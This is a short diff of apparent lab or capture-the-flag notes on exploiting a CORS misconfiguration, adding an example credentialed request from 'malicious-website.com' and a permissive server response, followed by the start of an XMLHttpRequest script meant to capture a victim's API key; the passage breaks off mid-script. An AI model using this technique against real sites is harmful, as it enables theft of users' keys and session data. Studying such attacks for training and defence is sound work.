@@ -2,6 +2,21 @@
 # Once target user navigates to exploit server they are redirected to their /accountDetails page which then reflects target's api Key in the URL
 # This information can be logged in the reqListener function
 
+
+####
+EX GET Request/Response
+
+GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://malicious-website.com
+Cookie: sessionid=...
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://malicious-website.com
+Access-Control-Allow-Credentials: true
+
+####
+
 <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
